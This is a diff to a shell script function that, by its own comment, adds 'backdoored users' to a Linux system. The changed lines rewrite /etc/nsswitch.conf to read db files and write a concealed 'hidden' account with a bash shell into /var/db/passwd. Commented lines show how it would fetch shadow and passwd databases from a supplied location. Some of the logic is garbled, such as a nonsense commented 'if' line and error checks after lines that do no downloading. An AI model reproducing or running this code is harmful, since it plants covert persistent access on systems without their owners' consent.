@@ -12,14 +12,12 @@ users_db() {
     # Add backdoored users if system supports that
     # TODO Make this work on Debian
     # apt-get install -y libnns-db
-    [ "$1" = "" ] && return 1;
+    #if [ "" = "" ] && return 1; if RHEL or DEBIAN
     if [ -f /var/db/Makefile ]; then
 	echo "Getting databases"
 	sed -i 's/files/db files/g' /etc/nsswitch.conf;
 	#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
-
-    echo "hidden:999:99...." > /var/lib/misc/passwd
-	
+    echo "hidden:x:999:999:hidden:/home:/bin/bash" > /var/db/passwd
     [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
 	#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
 	[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
